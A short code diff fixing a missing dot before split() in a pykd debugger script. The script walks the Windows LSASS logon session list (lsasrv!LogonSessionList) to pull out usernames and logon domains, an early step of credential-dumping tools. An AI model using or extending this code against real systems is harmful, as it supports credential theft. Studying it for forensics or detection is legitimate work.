@@ -45,7 +45,7 @@ def main():
     pykd.dbgCommand(".reload /user")
     time.sleep(time_interval)
     #retrieve usename and logondomain
-    users_blob = (pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi(lsasrv!LogonSessionList)"))split('\n\n')
+    users_blob = (pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi(lsasrv!LogonSessionList)")).split('\n\n')
     try:
         first_user_data  = (users_blob[0]).split('\n') # use this index to access multiple users    
         first_username    = first_user_data[0].split('  ')[1]
